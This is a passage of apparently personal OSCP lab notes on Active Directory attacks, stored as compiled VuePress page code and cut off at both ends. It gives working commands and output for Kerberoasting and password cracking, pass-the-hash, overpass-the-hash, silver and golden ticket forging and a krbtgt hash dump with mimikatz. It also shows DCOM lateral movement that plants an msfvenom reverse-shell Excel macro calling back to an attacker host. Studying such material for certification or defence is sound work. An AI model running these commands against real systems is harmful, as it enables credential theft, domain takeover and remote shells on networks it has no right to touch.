string"}},[s._v("'HTTP/CorpWe\nbServer.corp.com'")]),s._v("\n\nId                   : uuid-393f01fe-efad-46c9-a875-8ddc9eb96828-2\nSecurityKeys         : "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("System"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("IdentityModel"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Tokens"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("InMemorySymmetricSecurityKey"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\nValidFrom            : 5/29/2020 8:30:02 PM\nValidTo              : 5/30/2020 6:26:32 AM\nServicePrincipalName : HTTP/CorpWebServer"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("corp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("com\nSecurityKey          : System"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("IdentityModel"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Tokens"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("InMemorySymmetricSecurityKey\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# can alternatively use klist command ")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("PS")]),s._v(" C:\\Windows\\system32> klist\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# or inside mimikatz to export into files to be downloaded to attack machine:")]),s._v("\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# kerberos::list /export")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Or use Invoke-kerberoast")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Import-Module")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("\\"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Invoke-Kerberoast")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("ps1\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Invoke-Kerberoast")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("OutputFormat john "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("|")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Select-Object")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ExpandProperty hash "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("|")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("replace"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("':'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("':$krb5tgs$23$'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])]),t("p",[s._v("Now to crack service tickets to find clear-text passwords for service accounts")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("~/kerberoast"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("master*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("  python3 tgsrepcrack.py rockyou-20.txt ~/OSCP-excercises/1-40a50000-offsec@HTTP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("~CorpWebServer.corp.com-CORP.COM.kirbi                              omar2535@kali\n\n\nUSE HASHCAT, IT'S HELLA FASTER"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("\n\n\nCracking "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" tickets"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\nfound password "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" ticket "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(": Qwerty09"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("  File: /home/omar2535/OSCP-excercises/1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi\nSuccessfully cracked all tickets\n")])])]),t("h3",{attrs:{id:"pass-the-hash"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#pass-the-hash"}},[s._v("#")]),s._v(" Pass the Hash")]),s._v(" "),t("p",[s._v("Once the NTLM hash is retrieved, we can construct a pass the hash attack to elevate our priveleges using NTLM authentication.\nFor example, if our NTLM hash was "),t("code",[s._v("2892d26cdf84d7a70e2eb3b9f05c425e")]),s._v(", then our command to pass the hash would be")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# the following command will launch a rdesktop with that user's hash")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v('# the aad3b435b51404eeaad3b435b51404ee part after the userid means "no password"')]),s._v("\npth-winexe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-U")]),s._v(" offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.194.10 cmd \n\nE_md4hash wrapper called.\nHASH PASS: Substituting user supplied NTLM HASH"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\nMicrosoft Windows "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Version "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),s._v(".16299.15"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("c"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2017")]),s._v(" Microsoft Corporation. All rights reserved.\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("system3"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("\n")])])]),t("h3",{attrs:{id:"overpass-the-hash"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#overpass-the-hash"}},[s._v("#")]),s._v(" Overpass the hash")]),s._v(" "),t("p",[s._v("We can bypass NTLM authentication and get a TGT by passing the hash within mimikats like so:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("mimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# sekurlsa::pth /user:jeff_admin /domain:corp.com /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe")]),s._v("\n")])])]),t("p",[s._v("and a powershell is spawned. To check our kerberos tickets:")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("> klist\n")])])]),t("p",[s._v("Now we can log into the domain controller using psexec like so:")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("PS")]),s._v(" C:\\Tools\\active_directory> "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("\\PsExec"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe \\\\dc01 cmd"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe\n")])])]),t("h3",{attrs:{id:"creating-a-silver-ticket-to-authenticate-with"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#creating-a-silver-ticket-to-authenticate-with"}},[s._v("#")]),s._v(" Creating a silver ticket to authenticate with")]),s._v(" "),t("p",[s._v("First find the SID:")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("PS")]),s._v(" C:\\Tools\\active_directory> whoami "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("user\n\nUSER INFORMATION\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),s._v("\n\nUser Name   SID\n=========== ==============================================\ncorp\\offsec S-1-5-21-4038953314-3014849035-1274281563-1103\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("PS")]),s._v(" C:\\Tools\\active_directory> "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("\\mimikatz"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe\n")])])]),t("p",[s._v("Now purge all existing tickets")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("mimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# kerberos::purge")]),s._v("\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# kerberos::list")]),s._v("\n")])])]),t("p",[s._v("Now create the new ticket with the sid's last portion cut off and the rc4 from the NTLM hash")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("mimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt")]),s._v("\n")])])]),t("h3",{attrs:{id:"distributed-component-object-model-pivoting"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#distributed-component-object-model-pivoting"}},[s._v("#")]),s._v(" Distributed Component Object model (Pivoting)")]),s._v(" "),t("p",[s._v("We can launch applications on another computer from a workstation with microsoft office installed.")]),s._v(" "),t("p",[s._v("First let's view the available methods and find if the "),t("code",[s._v("run")]),s._v(" method is available.")]),s._v(" "),t("p",[s._v("Ip addresss of remote workstation: 172.16.194.5")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$com")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token namespace"}},[s._v("[activator]")]),s._v("::CreateInstance"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token namespace"}},[s._v("[type]")]),s._v("::GetTypeFromProgId"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Excel.Application"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"172.16.194.5"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$com")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("|")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Get-Member")]),s._v("\n")])])]),t("p",[s._v("Now create the excel macro")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".194.10 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5555")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" vba-psh "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" new_payload.txt\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" new_payload.txt\n")])])]),t("p",[s._v("copy it to the remote computer")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$LocalPath")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\Users\\jeff_admin\\Documents\\myexcel.xls"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$RemotePath")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\\\172.16.194.5\\c$\\myexcel.xls"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token namespace"}},[s._v("[System.IO.File]")]),s._v("::"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Copy")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$LocalPath")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$RemotePath")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("$True")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])])]),t("p",[s._v("Now open the excel file from our machine by creating a system profile on the remote machine then running it")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$com")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token namespace"}},[s._v("[activator]")]),s._v("::CreateInstance"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token namespace"}},[s._v("[type]")]),s._v("::GetTypeFromProgId"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Excel.Application"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"172.16.194.5"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$Path")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\\\172.16.194.5\\c$\\Windows\\sysWOW64\\config\\systemprofile\\Desktop"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$temp")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token namespace"}},[s._v("[system.io.directory]")]),s._v("::createDirectory"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$Path")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$Workbook")]),s._v(" = "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$com")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Workbooks"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Open"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\myexcel.xls"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$com")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Run"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"mymacro"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$com")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Run"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Workbook_Open"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$com")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Run"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"mOaoZH8"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$com")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Run"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"AutoOpen"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])])]),t("h3",{attrs:{id:"creating-a-golden-ticket-to-psexec-on-domain-controller"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#creating-a-golden-ticket-to-psexec-on-domain-controller"}},[s._v("#")]),s._v(" Creating a golden ticket to psexec on domain controller")]),s._v(" "),t("p",[s._v("Go into the domain controller and grab the NTLM hash")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# On the domain controller:")]),s._v("\nC:\\Tools>mimikatz"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe\n\n  "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v('## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)')]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'## v ##'")]),s._v("       Vincent LE TOUX             "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" vincent"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("letoux@gmail"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("com "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n  "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'#####'")]),s._v("        > http:"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("pingcastle"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("com "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v(" http:"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("mysmartlogon"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("com   "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("\n\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# privilege::debug")]),s._v("\nPrivilege "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'20'")]),s._v(" OK\n\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# lsadump::lsa /patch")]),s._v("\n\nRID  : 000001f6 "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("502"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nUser : krbtgt\nLM   :\nNTLM : fc274a94b36874d2560a7bd332604fab\n")])])]),t("p",[s._v("Now on the workstation:")]),s._v(" "),t("p",[s._v("Find the SID first using "),t("code",[s._v("whoami /user")]),s._v(" without the last part after the "),t("code",[s._v("-")]),s._v(".")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[s._v("C:\\Tools>mimikatz"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exe\n\n  "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v('## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)')]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")]),s._v("\n "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'## v ##'")]),s._v("       Vincent LE TOUX             "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" vincent"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("letoux@gmail"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("com "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n  "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'#####'")]),s._v("        > http:"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("pingcastle"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("com "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v(" http:"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("mysmartlogon"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("com   "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("\n\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# privilege::debug")]),s._v("\nPrivilege "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'20'")]),s._v(" OK\n\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# kerberos::purge")]),s._v("\nTicket"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" purge "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" current session is OK\n\nmimikatz "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt")]),s._v("\n")])])]),t("p",[s._v("Now we can launch a command prompt on the domain controller using "),t("code",[s._v("psexec")]),s._v(" like so:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("system3"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("cd C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Tools"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("active_directory\n\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Tools"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("active_directory"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("PsExec.exe "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("dc01 cmd.exe\n\nPsExec v2.2 - Execute processes remotely\nCopyright "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("C"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2001")]),s._v("-2016 Mark Russinovich\nSysinternals - www.sysinternals.com\n\n\nMicrosoft Windows "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Version "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),s._v(".14393"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("c"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2016")]),s._v(" Microsoft Corporation. All rights reserved.\n\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("system3"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("whoami\ncorp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("fakeuser\n")])])]),t("h2",{attrs:{id:"password-cracking"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#password-cracking"}},[s._v("#")]),s._v(" Password cracking")]),s._v(" "),t("h3",{attrs:{id:"hash-identifier"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#hash-identifier"}},[s._v("#")]),s._v(" Hash identifier")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("hash-identifier AAFDC23870ECBCD3D557B6423A8982134E17927E\n")])])]),t("h2",{attrs:{id:"wordpress-scanning"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#wordpress-scanning"}},[s._v("#")]),s._v(" Wordpress scanning")]),s._v(" "),t("p",[s._v("The following command saves the output to a file "),t("code",[s._v("sandbox-wpscan")])]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("wpscan 